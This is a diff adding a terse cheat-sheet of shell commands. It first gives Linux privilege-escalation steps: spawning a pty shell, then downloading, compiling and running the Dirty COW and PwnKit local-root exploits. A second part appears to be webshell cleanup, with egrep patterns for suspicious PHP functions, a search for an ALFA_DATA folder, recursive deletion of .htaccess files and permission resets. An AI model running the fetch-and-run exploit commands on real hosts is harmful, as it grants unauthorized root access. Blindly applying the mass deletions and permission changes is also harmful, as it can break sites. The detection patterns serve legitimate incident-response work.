@@ -1,0 +1,34 @@
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+
+gcc -pthread dirty.c -o dirty -lcrypt
+
+===========================
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+PwnKit
+https://github.com/ly4k/PwnKit
+
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit
+chmod +x ./PwnKit
+./PwnKit
+
+
+
+find ./ -type f -name '*.php' -mtime -5 | xargs egrep -i "(base64_decode|rawurldecode|urldecode|gzinflate|gzuncompress|str_rot13|convert_uu|htmlspecialchars_decode|bin2hex|hex2bin|hexdec|chr|strrev|goto|implode|strtr|extract|parse_str|substr|mb_substr|str_replace|substr_replace|preg_replace|exif_read_data|readgzfile|eval|exec|shell_exec|system|passthru|pcntl_fork|fsockopen|proc_open|popen|assert|posix_kill|posix_setpgid|posix_setsid|posix_setuid|proc_nice|proc_close|proc_terminate|apache_child_terminate|posix_getuid|posix_geteuid|posix_getegid|posix_getpwuid|posix_getgrgid|posix_mkfifo|posix_getlogin|posix_ttyname|getenv|proc_get_status|get_cfg_var|disk_free_space|disk_total_space|diskfreespace|getlastmo|getmyinode|getmypid|getmyuid|getmygid|fileowner|filegroup|get_current_user|pathinfo|getcwd|sys_get_temp_dir|basename|phpinfo|mysql_connect|mysqli_connect|mysqli_query|mysql_query|fopen|fsockopen|file_put_contents|file_get_contents|url_get_contents|stream_get_meta_data|move_uploaded_file|$_files|copy|include|include_once|require|require_once|file|mail|putenv|curl_init|tmpfile|allow_url_fopen|ini_set|set_time_limit|session_start|symlink|halt_compiler|__compiler_halt_offset|error_reporting|create_function|get_magic_quotes_gpc|$auth_pass|$password) *\(" -la
+
+find ./ -type f -mtime -5 | xargs egrep -i "(base64_decode|rawurldecode|urldecode|gzinflate|gzuncompress|str_rot13|convert_uu|htmlspecialchars_decode|bin2hex|hex2bin|hexdec|chr|strrev|goto|implode|strtr|extract|parse_str|substr|mb_substr|str_replace|substr_replace|preg_replace|exif_read_data|readgzfile|eval|exec|shell_exec|system|passthru|pcntl_fork|fsockopen|proc_open|popen|assert|posix_kill|posix_setpgid|posix_setsid|posix_setuid|proc_nice|proc_close|proc_terminate|apache_child_terminate|posix_getuid|posix_geteuid|posix_getegid|posix_getpwuid|posix_getgrgid|posix_mkfifo|posix_getlogin|posix_ttyname|getenv|proc_get_status|get_cfg_var|disk_free_space|disk_total_space|diskfreespace|getlastmo|getmyinode|getmypid|getmyuid|getmygid|fileowner|filegroup|get_current_user|pathinfo|getcwd|sys_get_temp_dir|basename|phpinfo|mysql_connect|mysqli_connect|mysqli_query|mysql_query|fopen|fsockopen|file_put_contents|file_get_contents|url_get_contents|stream_get_meta_data|move_uploaded_file|$_files|copy|include|include_once|require|require_once|file|mail|putenv|curl_init|tmpfile|allow_url_fopen|ini_set|set_time_limit|session_start|symlink|halt_compiler|__compiler_halt_offset|error_reporting|create_function|get_magic_quotes_gpc|$auth_pass|$password) *\(" -la
+
+
+
+find ./ -type f -name .htaccess -delete
+
+
+find ./ -type d -name ALFA_DATA
+
+
+
+find . -type f -exec chmod 0644 {} \;
+find . -type d -exec chmod 0711 {} \;
